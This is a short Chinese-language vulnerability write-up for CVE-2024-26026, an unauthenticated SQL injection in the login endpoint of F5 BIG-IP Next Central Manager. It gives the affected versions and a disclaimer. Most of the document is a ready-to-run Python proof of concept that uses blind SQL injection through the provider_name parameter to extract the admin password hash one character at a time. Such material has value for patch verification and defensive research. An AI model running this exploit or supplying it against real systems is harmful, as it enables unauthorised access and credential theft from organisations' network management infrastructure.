# CVE-2024-26026

>   F5 BIG-IP Next Central Manager可用于全面管理、自动化和监控部署在任何地方的众多BIG-IP Next实例。

## 来源

[https://eclypsium.com/blog/big-vulnerabilities-in-next-gen-big-ip/](https://eclypsium.com/blog/big-vulnerabilities-in-next-gen-big-ip/)

## 简介

F5 BIG-IP Next Central Manager的/api/login接口处的provider_name参数存在SQL注入漏洞，攻击者可在无需登陆的情况下利用此漏洞注入获取数据库中的敏感信息。

## 漏洞类型

SQL注入

## 影响范围

-   20.0.1 <= BIG-IP Next Central Manager <= 20.1.0

## POC

```python
import string
 
import requests
import urllib3
import argparse
 
urllib3.disable_warnings()
 
def encode_string(s: str) -> str:
    return ",".join([f"chr({ord(c)})" for c in s])
 
def leak_hash(target: str, target_user: str = "admin"):
    charset = string.digits + string.ascii_letters + '/.$'
    encoded_user = encode_string(target_user)
 
    URL = f"{target}/api/login"
    current_guess = ''
    while True:
        guessed = False
        for guess in charset:
            full_guess = encode_string(current_guess + guess + '%')
            stuff = requests.post(URL, json={
                "username": "fake_user",
                "password": "password",
                "provider_type": "LDAP",
                "provider_name": f"LDAPP'or' name = (select case when (password like concat({full_guess})) then chr(76)||chr(111)||chr(99)||chr(97)||chr(108) else chr(76) end from mbiq_system.users where username like concat({encoded_user}) limit 1)"
            }, verify=False).json()
            if "root distinguished name is required" in stuff["message"]:
                guessed = True
                current_guess += guess
                print("[+]", current_guess)
                break
        if not guessed:
            break
 
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Leak the admin password hash')
    parser.add_argument('target', type=str, help='The target URL')
    parser.add_argument('target_user', type=str, help='The target user', default='admin', nargs='?')
    args = parser.parse_args()
    leak_hash(args.target, args.target_user)
```

## 免责声明

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。